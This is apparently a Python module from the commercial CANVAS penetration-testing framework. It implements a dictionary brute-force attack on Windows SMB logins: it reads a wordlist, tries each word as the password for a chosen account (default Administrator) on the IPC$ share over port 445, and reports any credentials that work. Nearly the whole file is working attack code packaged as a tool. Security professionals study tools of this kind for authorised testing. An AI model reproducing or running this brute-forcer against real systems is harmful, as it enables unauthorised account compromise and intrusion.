#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2005-2007
#http://www.immunityinc.com/CANVAS/ for more information

#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import os
import getopt
import sys
import socket
import time
import struct

if '.' not in sys.path: sys.path.append('.')

from exploitutils import *
from tcpexploit import tcpexploit
import msrpc

NAME='SMB bruteforcer'
DESCRIPTION='Slow SMB bruteforcer'

DOCUMENTATION={}
DOCUMENTATION['Date public']='10/21/04'
DOCUMENTATION['References']=''
DOCUMENTATION['Repeatability']='Infinite'
DOCUMENTATION['Notes']='This just does a slow brute force against a username using a dictionary'
VERSION='0.1'

PROPERTY={}
PROPERTY['TYPE']='Tools'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['NT','2000','XP','2003']

NOTES=""" 
"""

CHANGELOG="""
"""

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)        
        self.name=NAME
        self.port=445
        self.filename='/usr/share/dict/words'
        self.share='IPC$'
        self.user='Administrator'
        self.password=''
        return

    def getArgs(self):
        self.host=self.target.interface
        self.user=self.argsDict.get('user',self.user)
        self.filename=self.argsDict.get('filename',self.filename)
        self.share=self.argsDict.get('command',self.share)
        self.port=self.argsDict.get('port',self.port)
        return

    def test(self):
        self.getArgs()
        self.log('%s running against %s:%s covertness: %d'%(NAME,self.host,self.port,self.covertness))
        self.setInfo('%s attacking %s:%s (Covertness:%d) - running'%(NAME,self.host,self.port,self.covertness))
        #self.log('Using user=%s, password=%s'%(self.user,self.password))
        smbobj=msrpc.SMB(self.host,getsock=self)
        smbobj.covertness=self.covertness
        smbobj.username=self.user
        smbobj.password=self.password
        ret=smbobj.connect()
        if not ret:
            self.log('Could not connect to remote host')
            return 0
        self.log('Trying treeconnect_AndX on share %s'%(self.share))
        ret=smbobj.treeconnect(self.share)
        if not ret:
            self.log('Failed to connect to share!')
            return 0
        self.log('Connected to share %s'%(self.share))
        smbobj.close()
        return 1

    def run(self):
        self.getArgs()
        self.log('%s running against %s:%s covertness: %d'%(NAME,self.host,self.port,self.covertness))
        self.setInfo('%s attacking %s:%s (Covertness:%d) - running'%(NAME,self.host,self.port,self.covertness))
        #self.log('Using user=%s, password=%s'%(self.user,self.password))
        try:
            passwords=file(self.filename).readlines()
        except:
            self.log('Failed to open password file %s'%(self.filename))
            return 0
        passwords.insert(0,self.user)
        passwords.insert(0,'')
        for password in passwords:
            if self.state==self.HALT:
                self.log('Halted')
                return 0
            password=password.strip()
            smbobj=msrpc.SMB(self.host,getsock=self)
            smbobj.covertness=self.covertness
            smbobj.username=self.user
            smbobj.password=password
            ret=smbobj.connect()
            if not ret:
                self.log('Could not connect to remote host as "%s":"%s"'%(self.user,password))
                continue
            self.log('Trying TreeConnect_AndX on share %s'%self.share)
            ret=smbobj.treeconnect(self.share)
            if not ret:
                self.log('Failed to connect to share as "%s":"%s"!'%(self.user,password))
                continue
            self.log('Connected to share %s with "%s":"%s"'%(self.share,self.user,password))
            self.log('Done with exploit')
            self.setInfo('%s attacking %s:%d (Covertness:%d) - done (found:%s:%s)'%(NAME,self.host,self.port,self.covertness,self.user,password))
            return 1
        self.setInfo('%s attacking %s:%d (Covertness:%d) - done (failed)'%(NAME,self.host,self.port,self.covertness))
        return 0        

    def usage(self):
        print 'Usage: %s -t host -p port [-U user -P password] [-O filename:/usr/share/dict/cracklib-small] [-C covertness]'%(sys.argv[0])
        sys.exit(0)

if __name__=='__main__':
    app=theexploit()
    ret=standard_callback_commandline(app)
